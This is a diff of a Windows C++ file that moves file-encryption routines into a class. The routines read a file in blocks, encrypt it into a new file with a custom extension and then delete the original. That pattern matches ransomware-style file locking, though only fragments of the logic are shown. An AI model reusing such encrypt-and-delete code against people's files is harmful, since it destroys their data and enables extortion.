@@ -1,14 +1,17 @@
 #include "stdafx.h"
+#include "rw.h"
 
+file::file()
+{
+}
 
-//extract file extension
-//create new file and push extension at the beginning
-//read 2048 bytes from file or until EOF
-//Encrypt buffer
-//write buffer to a new file with custom extension
-void startProcedureOnFile(std::wstring file) {
-	BOOL isLastBlock=FALSE;
+file::~file()
+{
+}
+
+void file::startProcedureOnFile(std::wstring file, crypt *cryptObj) {
 	using namespace std;
+	BOOL isLastBlock=FALSE;
 	DWORD readBytes;
 	DWORD errorCode;
 	BOOL EOFstate;
@@ -49,7 +52,7 @@ void startProcedureOnFile(std::wstring file) {
 			break;
 		}
 		else {
-			encryptBuffer(readBuf, readBytes, isLastBlock);
+			cryptObj->encryptBuffer(readBuf, readBytes, isLastBlock);
 			WriteFile(EncFileHandle, readBuf, readBytes, &readBytes, NULL);
 		}
 	}
@@ -59,7 +62,7 @@ void startProcedureOnFile(std::wstring file) {
 	CloseHandle(PrevFileHandle);
 	DeleteFile(file.c_str());
 }
-void decryptProcedure(std::wstring file) {
+void file::decryptProcedure(std::wstring file, crypt *cryptObj) {
 	using namespace std;
 	DWORD readBytes;
 	BOOL isLastBlock = FALSE;
@@ -88,7 +91,7 @@ void decryptProcedure(std::wstring file) {
 			break;
 		}
 		else {
-			decryptBuffer(readBuf, readBytes, isLastBlock);
+			cryptObj->decryptBuffer(readBuf, readBytes, isLastBlock);
 			WriteFile(decFileHandle, readBuf, readBytes, &readBytes, NULL);
 		}
 	}
